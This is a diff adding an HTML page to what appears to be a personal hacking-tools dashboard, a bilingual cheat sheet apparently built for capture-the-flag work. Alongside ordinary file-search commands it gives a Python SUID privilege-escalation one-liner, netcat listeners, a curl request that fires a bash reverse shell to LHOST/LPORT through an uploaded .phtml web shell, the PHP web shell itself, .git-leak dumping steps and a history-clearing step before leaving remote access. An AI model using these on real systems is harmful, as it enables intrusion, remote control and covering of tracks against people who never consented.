@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<link rel="icon" type="image/svg+xml" href="../assets/images/dragon-logo.svg">
+<link rel="icon" type="image/png" href="../assets/images/dragon-favicon.png">
+<title>Others – Hacking Tools</title>
+<link rel="stylesheet" type="text/css" href="../assets/css/style.css">
+
+</head>
+
+<body class="theme-standard" data-page-key="tools-misc">
+<div class="wallpaper"></div>
+
+<div class="tool-section-nav"><a href="../index.html?page=dashboard" target="_top">&larr; Back to Dashboard</a></div>
+
+<h1 class="category-title">Others</h1>
+
+<div class="grid">
+  <div class="modal" style="margin: 0 auto 3rem; max-width: 1000px; cursor: default;">
+    <table>
+      <tr><th>Tool</th><th>Description</th></tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-autres')">
+        <td>Others</td><td>Other commands</td>
+      </tr>
+      <tr id="cmd-autres" class="command-row">
+        <td colspan="2" class="command-cell">
+
+          <div class="comment-line">---- Find file -----</div>
+          <div>
+              find / -type f -name "root.txt" 2>/dev/null </br>
+              find / -type f -name "user.txt" 2>/dev/null
+          </div>
+
+          <div class="comment-line">---- Find SUID -----</div>
+          <div>
+              find / -user root -perm -4000 -type f 2>/dev/null
+          </div>
+
+          <div class="comment-line">---- Find Python -----</div>
+          <div>
+              find / -perm -4000 2>/dev/null | grep python
+          </div>
+
+          <div class="comment-line">---- Priv Esc -----</div>
+          <div>
+              Python PrivEsc : https://gtfobins.org/gtfobins/python/#shell </br>
+              python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+          </div>
+
+         <div class="comment-line">---- ReverseShell Cheat -----</div> 
+          <div>
+              https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+          </div>
+
+          <div class="comment-line">---- Reverse Shell cmd  -----</div> 
+          <div>
+            nc -lvnp 443</br>
+            rlwrap nc -lvnp 443</br>
+            curl "http://MACHINE_IP/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/LHOST/LPORT+0>%261'"
+          </div>
+
+
+          <div class="comment-line">---- php script .phtml ; .php5  -----</div> 
+            <div>
+          <textarea class="pro-textarea">
+          
+            <?php
+            if(isset($_GET['cmd'])) {
+                echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+            }
+            ?>
+          </textarea>
+</div> 
+
+        </td>
+      </tr>
+
+
+    <tr class="tool-row" onclick="toggleCmd('cmd-filesearch')">
+      <td>File search</td><td>Finding files commands</td>
+    </tr>
+
+    <tr id="cmd-filesearch" class="command-row">
+      <td colspan="2" class="command-cell">
+
+        <div class="comment-line">---- Recherche un fichier -----</div>
+        <div>[Trouver un fichier contenant un mot] — find / -type f -name "*flag*" 2>/dev/null</div>
+        <div>[Trouver par extension] — find / -type f -name "*.txt" 2>/dev/null</div>
+
+        <div class="comment-line">---- Search for IP address -----</div>
+        <div>[Trouver fichiers contenant une IP] — grep -RlE "([0-9]{1,3}\.){3}[0-9]{1,3}" /chemin 2>/dev/null</div>
+        <div>[Voir lignes contenant une IP] — grep -RniE "([0-9]{1,3}\.){3}[0-9]{1,3}" /chemin</div>
+
+        <div class="comment-line">---- Get info on file -----</div>
+        <div>[Voir infos complètes] — stat /file</div>
+        <div>[Trouver fichiers exécutables par tous] — find / -type f -perm -o=x 2>/dev/null</div>
+        <div>[Trouver fichiers 755] — find / -type f -perm 755 2>/dev/null</div>
+
+        <div class="comment-line">---- Nombre de lignes -----</div>
+        <div>[Compter lignes] — wc -l /fichier.txt</div>
+        <div>[Compter lignes (output propre)] — wc -l < /fichier.txt</div>
+
+        <div class="comment-line">---- Trouver le SHA1 HASH du fichier -----</div>
+        <div>[SHA1] — sha1sum /fichier</div>
+        <div>[SHA256] — sha256sum /fichier</div>
+
+        <div class="comment-line">---- SUID Files (Privilege Escalation) -----</div>
+        <div>[Trouver fichiers SUID] — find / -type f -perm -4000 2>/dev/null</div>
+        <div>[Trouver fichiers SUID + exécutables] — find / -type f -perm -u=x -perm -4000 2>/dev/null</div>
+
+        <div class="comment-line">---- SGID Files -----</div>
+        <div>[Trouver fichiers SGID] — find / -type f -perm -2000 2>/dev/null</div>
+
+        <div class="comment-line">---- World-Writable Files -----</div>
+        <div>[Fichiers modifiables par tout le monde] — find / -type f -perm -o=w 2>/dev/null</div>
+        <div>[Dossiers modifiables par tout le monde] — find / -type d -perm -o=w 2>/dev/null</div>
+
+        <div class="comment-line">---- Executable Files -----</div>
+        <div>[Trouver fichiers exécutables] — find / -type f -executable 2>/dev/null</div>
+        <div>[Trouver fichiers exécutables par others] — find / -type f -perm -o=x 2>/dev/null</div>
+
+        <div class="comment-line">---- Search Inside Files -----</div>
+        <div>[Chercher un mot dans les fichiers] — grep -Rni "mot" /chemin 2>/dev/null</div>
+        <div>[Chercher un motif regex] — grep -RniE "regex" /chemin 2>/dev/null</div>
+
+        <div class="comment-line">---- File Type Identification -----</div>
+        <div>[Identifier type du fichier] — file /chemin/fichier</div>
+        <div>[Voir contenu lisible d’un binaire] — strings /chemin/fichier</div>
+
+        <div class="comment-line">---- File Size / Sorting -----</div>
+        <div>[Lister fichiers par taille] — find / -type f -exec ls -lh {} \; | sort -k5 -h</div>
+        <div>[Trouver fichiers > 10MB] — find / -type f -size +10M</div>
+
+
+      </td>
+    </tr>
+
+
+
+    <tr class="tool-row" onclick="toggleCmd('cmd-gitdump')">
+  <td>Git dump</td><td>Exploiter une fuite .git</td>
+  </tr>
+
+  <tr id="cmd-gitdump" class="command-row">
+    <td colspan="2" class="command-cell">
+
+      <div class="comment-line">---- Télécharger le .git -----</div>
+      <div style="color:rgb(255, 0, 212)">[Télécharger .git] — wget -r -np -nH --cut-dirs=1 http://site/.git/</div>
+      <div style="color:rgb(255, 0, 212)">[Rebuild repo] — git reset --hard</div>
+
+      <div class="comment-line">---- Lister les objets -----</div>
+      <div>[Lister objets] — find .git/objects -type f</div>
+      <div style="color:rgb(255, 0, 212)">[Construire SHA‑1] — dossier + nom_fichier → ex: 25/abcd → SHA1 = 25abcd</div>
+
+      <div class="comment-line">---- Vérifier type d’objet -----</div>
+      <div>[Type] — git cat-file -t SHA1</div>
+      <div>[Chercher blobs] — git cat-file -t [SHA1] | grep blob</div>
+
+      <div class="comment-line">---- Lire le contenu -----</div>
+      <div style="color:rgb(255, 0, 212)">[Afficher blob] — git cat-file -p [SHA1]</div>
+      <div>[Chercher flag] — git cat-file -p [SHA1] | grep -i flag</div>
+
+      <div class="comment-line">---- Trouver objets cachés -----</div>
+      <div>[Objets non référencés] — git fsck --lost-found</div>
+      <div>[Commits supprimés] — git log --all --oneline</div>
+
+      <div class="comment-line">---- Résumé stratégique -----</div>
+      <div>[Flag souvent ici] — blobs non référencés (pas dans index, pas dans HEAD)</div>
+      <div>[Ne pas utiliser] — index.html dans objects/ = FAUX fichiers générés par le serveur</div>
+
+      <div class="comment-line">---- Commande simplifier pour lire le fichier ----------------</div>
+      <div style="color:rgb(255, 0, 0)">python3 -c "import zlib,sys;print(zlib.decompress(sys.stdin.buffer.read()))" < 965c580fee91d852e5b19a8290da02d2926523</div>
+
+      <div class="comment-line">---- Autre outils pour simplifier le git-dump ----------------</div>
+      <div>pip install git-dumper</div>
+    </td>
+  </tr>
+
+
+
+     <tr class="tool-row" onclick="toggleCmd('cmd-quit')">
+  <td>Quit</td><td>What to do before quitting remote acces</td>
+  </tr>
+
+  <tr id="cmd-gitdump" class="command-row">
+    <td colspan="2" class="command-cell">
+
+      <div class="comment-line">---- Télécharger le .git -----</div>
+      <div>[Clear history] History -c </div>
+
+
+    </td>
+  </tr>
+
+
+     <tr class="tool-row" onclick="toggleCmd('cmd-init')">
+  <td>Init</td><td>Commandes de démarrage / initialisation</td>
+  </tr>
+
+  <tr id="cmd-init" class="command-row">
+    <td colspan="2" class="command-cell">
+
+      <div class="comment-line">---- Démarrer les shells (ttyd) -----</div>
+      <div>[Démarrer ttyd] — scripts/ttyd-shells.sh start</div>
+
+      <div class="comment-line">---- Monter le partage réseau -----</div>
+      <div>[Mount CIFS] — sudo mount -t cifs //&lt;serveur&gt;/&lt;partage&gt; /mnt/&lt;partage&gt; -o username=&lt;user&gt;,uid=$(id -u),gid=$(id -g),file_mode=0777,dir_mode=0777</div>
+
+    </td>
+  </tr>
+
+    </table>
+  </div>
+</div>
+
+<script>
+  const embedded = window.self !== window.top;
+
+  // Tell the hub's modal our real content height. Called synchronously on
+  // the one interaction that changes it (toggling a command row) so there's
+  // no dependency on observer/timer scheduling; ResizeObserver below is
+  // just a fallback for anything else (initial layout, font swaps, etc).
+  function reportHeight() {
+    if (embedded) {
+      window.parent.postMessage({ type: "tool-frame-height", height: document.body.scrollHeight }, "*");
+    }
+  }
+
+  function toggleCmd(id) {
+    const row = document.getElementById(id);
+    row.style.display = (row.style.display === "table-row") ? "none" : "table-row";
+    reportHeight();
+  }
+
+  (function() {
+    const savedTheme = localStorage.getItem("/settings.html") || "standard";
+    document.body.classList.add("theme-" + savedTheme);
+    if (embedded) document.body.classList.add("embedded");
+  })();
+
+  if (embedded) {
+    new ResizeObserver(reportHeight).observe(document.body);
+    window.addEventListener("load", reportHeight);
+  }
+</script>
+
+<script src="../config/tools/misc.js"></script>
+<script src="../assets/script/wallpaper-loader.js"></script>
+<script src="../assets/script/theme-accent.js"></script>
+<script src="../assets/script/copy-commands.js"></script>
+<script src="../assets/script/page-effects.js"></script>
+<script src="../assets/script/page-effects-loader.js"></script>
+<script>
+  applyWallpaper(toolsMiscConfig.background, "tools-misc");
+</script>
+
+</body>
+</html>
